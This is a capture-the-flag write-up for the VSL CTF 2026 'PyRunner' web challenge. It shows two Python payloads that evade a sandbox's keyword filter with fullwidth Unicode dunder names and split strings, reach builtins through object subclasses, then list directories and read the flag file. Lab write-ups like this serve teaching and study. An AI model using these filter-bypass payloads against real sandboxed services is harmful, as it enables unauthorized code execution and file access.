# PyRunner — VSL CTF 2026

> **Room / Challenge:** PyRunner (Web)

---

## Metadata

- **Author:** `jameskaois`
- **CTF:** VSL CTF 2026
- **Challenge:** PyRunner (web)
- **Target / URL:** `https://vsl-ctf.com/challenges#PyRunner-46`
- **Points:** `290`
- **Solved:** `30`
- **Date:** `26-01-2026`

---

## Goal

Bypassing Python sandbox filters and get the flag.

## My Solution

Get current and root directory files and folders:

```python
try:
    print("[+] Listing Directory...")
    G = ().__ｃｌａｓｓ__.__ｂａｓｅ__.__ｓｕｂｃｌａｓｓｅｓ__
    tgt = G()[-2].__ｉｎｉｔ__.__ｇｌｏｂａｌｓ__
    builtins = tgt['__buil'+'tins__']
    importer = builtins['__im'+'port__']
    os = importer('os')
    print("Current Dir:", os.listdir('.'))
    print("Root Dir:", os.listdir('/'))

except Exception as e:
    print(f"[-] Error: {e}")
```

Got `flag-16c4977d-be42-4bd6-a229-739e180dc37a.txt`:

```
[+] Listing Directory...

Current Dir: ['a', '__pycache__', 'flag-16c4977d-be42-4bd6-a229-739e180dc37a.txt', 'templates.py', 'app.py', 'sandbox.py', 'requirements.txt']

Root Dir: ['lib64', 'tmp', 'lib', 'sys', 'dev', 'mnt', 'root', 'home', 'usr', 'media', 'etc', 'srv', 'sbin', 'bin', 'boot', 'proc', 'run', 'var', 'opt', 'app', '.dockerenv', 'flag-16c4977d-be42-4bd6-a229-739e180dc37a.txt']
```

Read `flag-16c4977d-be42-4bd6-a229-739e180dc37a.txt`:

```python
try:
    G = ().__ｃｌａｓｓ__.__ｂａｓｅ__.__ｓｕｂｃｌａｓｓｅｓ__
    tgt = G()[-2].__ｉｎｉｔ__.__ｇｌｏｂａｌｓ__

    opener = tgt['__buil'+'tins__']['op'+'en']

    flag_content = opener('flag-16c4977d-be42-4bd6-a229-739e180dc37a.txt').read()

    print(f"[!!!] FLAG: {flag_content}")

except Exception as e:
    print(f"Final Error: {e}")
```
